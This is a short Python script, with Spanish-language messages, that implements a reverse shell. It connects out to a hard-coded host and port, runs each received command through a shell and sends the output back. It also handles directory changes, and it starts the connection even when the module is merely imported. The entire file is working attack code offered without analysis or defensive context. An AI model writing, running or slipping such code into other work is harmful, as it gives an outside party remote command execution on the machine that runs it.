import socket
from subprocess import PIPE, Popen
import os
     

def reverse():
    conectar = socket.socket()
    conectar.connect((HOST, PORT))
    while True:
        try:
            recibido = conectar.recv(1024).decode()

            if recibido.startswith("cd "):
                if os.path.exists(recibido[3:]) == False:
                    conectar.send(b"Este directorio no existe")
                    continue
                else:
                    os.chdir(recibido[3:])
                    conectar.send(b"$: ")
                    continue
                
             
            if recibido.lower() == "exit":
                break

            if len(recibido) > 0:     
                mensaje = Popen([recibido], shell=True, stdout=PIPE, stderr=PIPE)
                listado = mensaje.stdout.read()
                error = mensaje.stderr.read()
                if not error:
                    conectar.send(bytes(listado))
                else:
                    conectar.send(bytes(error))
        except KeyboardInterrupt:
            conectar.send(b"Se ha cerrado la conexion por parte del cliente")
            conectar.close()
        

if __name__ == "__main__":
    HOST = "192.168.1.122"
    PORT = 8001
    reverse()
    
else:
    HOST = "192.168.1.122"
    PORT = 8001
    reverse()
